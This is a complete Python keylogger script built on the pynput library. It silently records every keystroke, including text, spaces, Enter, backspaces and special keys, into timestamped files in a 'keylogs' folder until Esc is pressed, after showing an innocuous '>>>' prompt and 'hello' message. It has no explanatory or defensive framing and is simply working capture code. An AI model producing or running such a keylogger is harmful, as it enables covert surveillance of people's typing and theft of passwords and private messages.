import pynput.keyboard
import datetime
import os
log_dir = "keylogs"  
input(">>>")
print("hello")
if not os.path.exists(log_dir):
    os.makedirs(log_dir)
log_file_path = os.path.join(log_dir, f"keylog_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
log_data = ""
def on_press(key):
    global log_data
    try:
        log_data += str(key.char)
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log_data += ' '  
        elif key == pynput.keyboard.Key.enter:
            log_data += '\n'  
        elif key == pynput.keyboard.Key.backspace:
            log_data = log_data[:-1] 
        elif key == pynput.keyboard.Key.tab:
           log_data += '\t' 
        else:
            log_data += str(key)  
    current_time = datetime.datetime.now()
    if (current_time - start_time).seconds >= 10: 
        save_log_to_file()
def save_log_to_file():
    global log_data
    try:
        with open(log_file_path, "a") as f:  
            f.write(log_data)
            log_data = ""  
    except Exception as e:
        print(f"Error saving log: {e}")
def on_release(key):
    if key == pynput.keyboard.Key.esc: 
        save_log_to_file() 
        return False  
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    start_time = datetime.datetime.now() 
    listener.join() 
print("Keylogger stopped.")